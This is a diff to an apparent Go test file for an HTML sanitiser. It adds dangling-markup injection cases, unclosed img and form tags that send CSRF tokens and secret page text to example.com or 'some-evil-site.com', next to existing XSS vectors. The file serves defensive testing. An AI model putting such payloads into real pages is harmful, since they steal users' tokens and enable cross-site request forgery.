@@ -124,6 +124,22 @@ var htmlTests = []Test{
 #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`, ``},
 	{`'';!--"<XSS>=&{()}`, `'';!--"=&amp;{()}`},
 	{"LINE 1<br />\nLINE 2", "LINE 1\nLINE 2"},
+
+	// Examples from https://githubengineering.com/githubs-post-csp-journey/
+	{`<img src='https://example.com/log_csrf?html=`, ``},
+	{`<img src='https://example.com/log_csrf?html=
+<form action="https://example.com/account/public_keys/19023812091023">
+...
+<input type="hidden" name="csrf_token" value="some_csrf_token_value">
+</form>`, `...`},
+	{`<img src='https://example.com?d=https%3A%2F%2Fsome-evil-site.com%2Fimages%2Favatar.jpg%2f
+	<p>secret</p>`, `secret
+`},
+	{`<form action="https://some-evil-site.com"><button>Click</button><textarea name='
+<!-- </textarea> --><!-- '" -->
+<form action="/logout">
+  <input name="authenticity_token" type="hidden" value="secret1">
+</form>`, `Click --  `},
 }
 
 func TestHTML(t *testing.T) {
